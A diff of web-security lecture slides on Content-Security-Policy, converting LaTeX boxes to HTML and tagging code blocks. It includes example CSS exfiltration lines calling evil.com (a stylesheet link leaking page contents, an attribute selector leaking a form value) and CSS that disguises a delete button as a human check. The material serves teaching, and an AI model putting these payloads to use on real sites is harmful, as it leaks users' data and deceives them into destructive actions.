@@ -3,12 +3,11 @@
 
 
 * <code>Content-Security-Policy</code>: HTTP header sent to browsers
-* \\fbox{[]{.my-small} <code></code> Content-Security-Policy: default-src 'self' 'unsafe-inline'}
-* says ‘‘only load things from <em>same host</em> or <em>embedded in webpage</em>’’ 
+* <code style="border: 2px solid black">Content-Security-Policy: default-src 'self' 'unsafe-inline'</code><br>says ‘‘only load things from <em>same host</em> or <em>embedded in webpage</em>’’ 
 
    * loading image from <code>evil.com</code> will fail
 
-* \\fbox{\\parbox{11cm[]{.my-small} <code></code> Content-Security-Policy: script-src 'none';<br>object-src 'none'; style-src 'self'}}  
+* <div style="border: 2px solid black"><code>Content-Security-Policy: script-src 'none';<br>object-src 'none'; style-src 'self'</code></div>
 
    * disallow all scripts, all plugins/etc.
    * only allow stylesheets from same host (and not inline)
@@ -20,7 +19,7 @@
 
 * historical: IE 7 supported CSS expressions that can construct URLs from webpage data
 * getting web page contents:  
-```
+```html
 <link rel=stylesheet href="http://evil.com/?webpage contents here...
 
 ```
@@ -28,13 +27,13 @@
 * also can do things with stylesheets
 
 
-### Aside: why care about stylesheets? (2)  {.smaller}
+### Aside: why care about stylesheets? (2) 
 
 
 
 * conditional image loaded to get data? assuming pre-filled-in-form:
  
-```
+```css
 input[value^=Virginia] {background: url(http://evil.com?Virginia)}
 
 ```
@@ -42,7 +41,7 @@ input[value^=Virginia] {background: url(http://evil.com?Virginia)}
 
 * adjust webpage display in lots of ways
  
-```
+```css
 .delete-form::before {content: "Please verify that you are human: ";}
 button.cancel { display: none };
 button.delete { font-size: 0pt; }
@@ -54,25 +53,24 @@ button.delete::before { content: "I am Human!"; font-size: 16pt; }
 ### Content Security Policy examples (1)  {.smaller}
 
 
-* \\fbox{\\parbox{11cm<code></code> []{.my-small} Content-Security-Policy: script-src 'self' www.google-analytics.com; object-src 'none'}} 
+* <code style="border: 2px solid black">Content-Security-Policy: script-src 'self' www.google-analytics.com; object-src 'none'</code>
 
    * allow scripts from same host or <code>www.google-analytics.com</code>
    * <em>disallow inline scripts</em>
    * disallow plugins
 
-* \\fbox{\\parbox{11cm<code></code> []{.my-small} Content-Security-Policy: default-src 'none'; img-src 'self' https://…; …}}  
+* <code style="border: 2px solid black">Content-Security-Policy: default-src 'none'; img-src 'self' https://…; …</code>
 
    * allow nothing to start; then whitelist what is needed
    * recommended strategy
 
 
 
-### CSP nonces  {.smaller}
+### CSP nonces 
 
 
 ```html
-Content-Security-Policy: script-src https://foo.com
-                                    'nonce-DZJeVASMVs'
+Content-Security-Policy: script-src https://foo.com 'nonce-DZJeVASMVs'
 
 ...
 <script nonce="DZJeVASMVs">
@@ -136,7 +134,6 @@ document...
 ### CSP implementation bugs (2)  {.smaller}
 
 
-![](/web/franken-fig3){}
- 
-![](/web/franken-fig10){}
+![](/web/franken-fig3){width=49%}
+![](/web/franken-fig10){width=49%}
 
